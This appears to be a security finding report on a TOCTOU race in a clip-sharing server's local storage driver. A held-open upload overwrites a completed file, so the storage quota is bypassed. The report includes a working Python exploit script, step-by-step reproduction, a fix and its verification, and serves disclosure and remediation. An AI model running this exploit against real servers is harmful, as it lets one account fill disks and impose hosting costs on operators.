# Storage quota bypass via in-flight upload overwriting a completed clip (local storage driver)

**ID:** vuln-0010
**Severity:** MEDIUM
**Found:** 2026-11-19 17:05:38 UTC
**Target:** Clutch cloud server (server/src/index.mjs, server/src/storage.mjs)
**Endpoint:** PUT /upload/{ticket} and POST /api/clips/{id}/complete
**Method:** PUT
**CWE:** CWE-367
**CVSS:** 5.4
**Confidence:** High
**Fix Effort:** Low

## Description

With the local storage driver, an authenticated user can keep an upload request open across the clip's completion and then finish it. The server replaces the completed file with a much larger one, up to the announced size, while the quota records only the size seen at completion. A free account can store roughly 50 MB to 100 MB per clip while being billed about 20 KB, so the 2 GB quota no longer limits disk use.

## Evidence

Output from the vulnerable server (three iterations, free account):

```
before {'bytes': 0}
put small 200
complete 200 20000
slow put reply b'HTTP/1.1 200 OK'
accounted usage {'bytes': 20000}
...
accounted usage {'bytes': 60000}
```

Files on disk for that account: `151M`. Media served for each completed clip, with `size` 20000 in the database:

```
('OKkqOWVj', 20000, 'ready') served bytes 52428800 video/mp4
('ES6njBvI', 20000, 'ready') served bytes 52428800 video/mp4
('5IhGUpRp', 20000, 'ready') served bytes 52428800 video/mp4
```

After applying the fix, the held-open PUT is refused and disk use matches the accounting:

```
complete 200 20000
slow put reply b'HTTP/1.1 403 Forbidden'
accounted usage {'bytes': 60000}
64K  server/data/files/...
```

The existing server test suite passes (7 of 7) with the fix applied.

## Impact

A signed-in user can store far more data than the plan allows. The demonstration stored about 150 MB across three clips while the account usage read 60 KB, a ratio of about 2,500 to 1. The ratio is bounded only by the per-clip maximum (100 MB on Free, 1 GB on Pro), and the number of clips is unlimited. This defeats the quota fix from the 2026-11-18 review (`/complete` checks the real size against the claim and the quota). A single account can fill the server disk or run up hosting cost, and the data stays publicly downloadable through the share link. It applies when `STORAGE=local`, which the README documents as suitable for a small VPS. With `STORAGE=s3` the signed Content-Length forces the exact claimed size, so this specific path does not apply.\n\nRelated minimum-size weakness (separately demonstrated): `MIN_CLIP_BYTES` is not applied to the stored size, so `/complete` accepts 1-byte files. One free account created 400 completed clips in about 3 seconds; `/api/me` usage showed 400 bytes while the storage directory held 400 files using 1,640 KB on disk (about 4,100 times the accounted usage). No per-account clip-count limit exists, so file, inode and database-row growth is unbounded by the quota.

## Counterevidence

I looked for a control that closes this and found none on the local path. The pending check runs only once, at the start of the PUT. `writeLocal` has no check at rename time. `/complete` measures the file only at the moment it is called. The ticket `max` caps the size at the claim but does not prevent the replacement. The S3 driver is not affected because the signed Content-Length fixes the size. Quota reservations at creation work correctly (60 parallel 100 MB claims allowed exactly 20), so the bypass relies only on this race. Exploitation needs an account and a held-open connection, which is why it is Medium and not High.

## What Would Change This Severity

Severity would rise if the production deployment uses the local storage driver on a small disk and accounts are free to create at scale, since a single attacker could then fill the disk. It would fall to Low or None if the product only ever ships with the S3 driver.

## Technical Analysis

`POST /api/clips` reserves the claimed `size` and returns a signed upload ticket whose `max` equals the claim. `PUT /upload/:ticket` checks `clips.isPending(t.clip)` once, **before** streaming the body. It then calls `storage.writeLocal`, which streams to `<key>.part` and calls `fs.renameSync(tmp, file)` when the stream ends. That final rename has no second check of the clip state.

`POST /api/clips/:id/complete` stats the file on disk, so it sees whatever has been renamed so far. It stores that size in `clips.ready(c.id, size + thumb)` and flips the clip to `ready`.

An attacker does this:
1. Create a clip claiming 50 MB.
2. PUT 20 KB to the ticket. A real file now exists.
3. Open a second PUT to the same ticket with `Content-Length` of 50 MB and send only the first 1 KB. It already passed the pending check and is held open.
4. Call `/complete`. It reads a size of 20,000 bytes, the clip becomes `ready`, and the usage is 20 KB.
5. Send the rest of the second PUT. `writeLocal` finishes and renames the 50 MB body over the stored file. The ticket is no longer valid for new requests, but this request was admitted earlier and is never rechecked.

The second PUT stays inside the ticket `max`, so the size limit does not stop it. Once the clip is `ready`, nothing re-measures the file.

A related weakness comes from the same accounting: `MIN_CLIP_BYTES` only gates the claimed size, and the stored size is whatever arrives. A 1-byte upload completes successfully after claiming 10,240 bytes, so the minimum clip size added in the previous review is not enforced on what is stored.

## Proof of Concept

1. Start the server with `DEV_LOGIN=1`, `STORAGE=local` and a loopback `PUBLIC_URL`, and sign in through the dev login to get a session token.
2. Call `POST /api/clips` with `size` 52428800 and keep the returned `video.url` upload ticket.
3. PUT 20,000 random bytes to that URL so a file exists.
4. Open a second raw-socket PUT to the same URL with `Content-Length: 52428800` and send only 1,000 bytes, so it stays open.
5. Call `POST /api/clips/{id}/complete`. The response reports `size` 20000.
6. Send the remaining bytes on the held-open PUT and read its response. It returns HTTP 200.
7. Call `GET /api/me`. Usage shows 20000 bytes, but `GET /media/{shareId}/video.mp4` returns 52,428,800 bytes.
8. Repeat to multiply the effect. Three iterations stored 150 MB for 60 KB of recorded usage.

```python
import socket, time, urllib.parse, os, requests
B='http://127.0.0.1:8787'
S=requests.Session()

def login(name):
    r=S.get(B+'/auth/dev/start',params={'redirect':'http://127.0.0.1:9999/cb'},allow_redirects=False)
    st=urllib.parse.parse_qs(urllib.parse.urlparse(r.headers['Location']).query)['state'][0]
    r=S.post(B+'/auth/dev/callback',data={'state':st,'name':name},allow_redirects=False)
    tok=urllib.parse.parse_qs(urllib.parse.urlparse(r.headers['Location']).query)['token'][0]
    return {'Authorization':'Bearer '+tok}

h=login('racer')
CLAIM=50*1024*1024
print('before', S.get(B+'/api/me',headers=h).json()['usage'])
for i in range(3):
    c=S.post(B+'/api/clips',json={'size':CLAIM,'title':'x'},headers=h).json()
    url=c['video']['url']
    print('put small', S.put(url,data=os.urandom(20000)).status_code)
    u=urllib.parse.urlparse(url)
    s=socket.create_connection(('127.0.0.1',8787))
    s.sendall(f"PUT {u.path} HTTP/1.1\r\nHost: 127.0.0.1:8787\r\nContent-Type: video/mp4\r\nContent-Length: {CLAIM}\r\nConnection: close\r\n\r\n".encode())
    s.sendall(os.urandom(1000))
    time.sleep(0.5)
    r=S.post(B+f"/api/clips/{c['id']}/complete",headers=h); print('complete',r.status_code,r.json().get('size'))
    rem=CLAIM-1000
    while rem>0:
        n=min(rem,1<<20); s.sendall(os.urandom(n)); rem-=n
    print('slow put reply', s.recv(200).split(b'\r\n')[0]); s.close()
    time.sleep(0.3)
    print('accounted usage', S.get(B+'/api/me',headers=h).json()['usage'])
    sid=r.json()['shareUrl'].rsplit('/',1)[1]
    print('bytes served', len(S.get(B+f'/media/{sid}/video.mp4').content))
```

## Remediation

Re-check that the clip is still pending immediately before the rename in the local writer, and delete the partial file and refuse the request if it is not. The check and the rename must happen in the same synchronous step so that `/complete` cannot run between them. Optionally also reject any upload whose final size is smaller than the minimum clip size at `/complete`, so tiny clips cannot bypass the minimum. Keep the existing S3 behaviour, where the signed Content-Length fixes the size.

## Fix Verification

Gate 1: the diff touches only `writeLocal` and its one caller; `fix_before` matches the files at the given lines. The patched server starts. Gate 2: I re-ran the PoC against the patched copy. The held-open PUT now returns 403, the file stays at 20,000 bytes and disk use matches the accounting (64K on disk). Gate 3: on the local driver `complete` runs without any I/O yield, so the pending re-check and the rename execute in one synchronous step and cannot interleave with it. The thumbnail ticket goes through the same call and is covered. I did not test replacing the file with a second PUT before `complete`; that remains allowed, is bounded by the ticket max, and the file is measured afterwards. Gate 4: a normal upload (PUT then complete) still returns 200 with the right size. Gate 5: `npm test` in the server directory passes 7 of 7 with the patch. I did not add a regression test for the held-open PUT. The S3 driver is unchanged and not exercised.

## Assumptions

`STORAGE=local` is in use. The attacker holds a normal signed-in account. The server accepts a slow upload (the Node default `requestTimeout` allows up to 300 s) and the attacker can hold a connection open across the complete call.
